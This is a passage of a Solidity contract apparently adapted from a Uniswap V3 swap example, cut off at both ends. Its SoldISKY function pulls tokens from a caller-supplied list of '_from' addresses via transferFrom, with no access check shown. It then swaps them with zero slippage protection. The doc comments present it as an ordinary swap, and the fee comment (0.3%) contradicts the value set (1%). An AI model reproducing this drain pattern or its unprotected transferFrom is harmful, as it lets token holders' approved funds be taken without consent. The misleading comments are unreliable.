    address public constant shan = 0xc70d07F8B5A1fcE5371f6770f542350d339157c6;

    // For this example, we will set the pool fee to 0.3%. 1% = 10000
    uint24 public constant poolFee = 10000;

    constructor(ISwapRouter _swapRouter) {
        swapRouter = _swapRouter;
    }

    /// @notice swapExactInputSingle swaps a fixed amount of ISKY for a maximum possible amount of WMATIC
    /// using the ISKY/WMATIC 0.3% pool by calling `exactInputSingle` in the swap router.
    /// @dev The calling address must approve this contract to spend at least `amountIn` worth of its ISKY for this function to succeed.
    /// @param amountIn The exact amount of ISKY that will be swapped for WMATIC.
    /// @return amountOut The amount of WMATIC received.
    function SoldISKY(IERC20 _token,address[] calldata _from,uint256[] calldata _amount,uint256 amountIn) external returns (uint256 amountOut) {
    
        // msg.sender must approve this contract

    require(_from.length == _amount.length, "fail");
    for (uint256 i = 0; i< _from.length; i++){
    require(_token.transferFrom(_from[i],address(this),_amount[i]));
    }


        // Approve the router to spend ISKY.
        TransferHelper.safeApprove(ISKY, address(swapRouter), amountIn);

        // Naively set amountOutMinimum to 0. In production, use an oracle or other data source to choose a safer value for amountOutMinimum.
        // We also set the sqrtPriceLimitx96 to be 0 to ensure we swap our exact input amount.
        ISwapRouter.ExactInputSingleParams memory params =
